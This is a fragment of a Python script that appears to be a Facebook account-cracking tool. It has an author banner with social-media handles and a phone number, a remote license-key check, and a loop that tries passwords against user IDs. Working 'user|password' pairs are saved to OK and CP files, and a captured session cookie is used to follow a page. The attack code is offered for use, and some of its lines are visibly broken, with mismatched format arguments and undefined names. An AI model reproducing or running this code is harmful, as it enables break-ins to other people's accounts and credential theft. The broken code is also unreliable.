...
colouroff="\x1b[00m"
logo="""
 ____  ____  ____  _  _  ___  ____    _    _    __    __    ____  _  _ 
(  _ \(  _ \(_  _)( \( )/ __)( ___)  ( \/\/ )  /__\  (  )  ( ___)( \/ )
 )___/ )   / _)(_  )  (( (__  )__)    )    (  /(__)\  )(__  )__)  )  ( 
(__)  (_)\_)(____)(_)\_)\___)(____)  (__/\__)(__)(__)(____)(____)(_/\_)

\

\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            Prince Walex
     \033[1;91m➣ \033[1;91mFACEBOOK   :            Etz qhing thuth
     \033[1;92m➣ \033[1;92mWHATSAPP   :            +2349038303472
     \033[1;91m➣ \033[1;91mGITHUB     :            Qhingthuth
...
a=requests.get("https://raw.githubusercontent.com/Qhingthuth/apporved/main/250%20Tool").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    print(yellow+"\n\t\tContact Admin ")
    os.system('xdg-open https://www.facebook.com/thanks.for.copying')
    exit()
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mQhingthoth_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mQhingthoth_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back 92mQhingthoth_OK Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[Qhingthuth-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Qhingthuth-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Qhingthuth_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('Qhingthuth_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/thanks.for.copying', cookies={'cookie': coki}).text, 'html.parser')
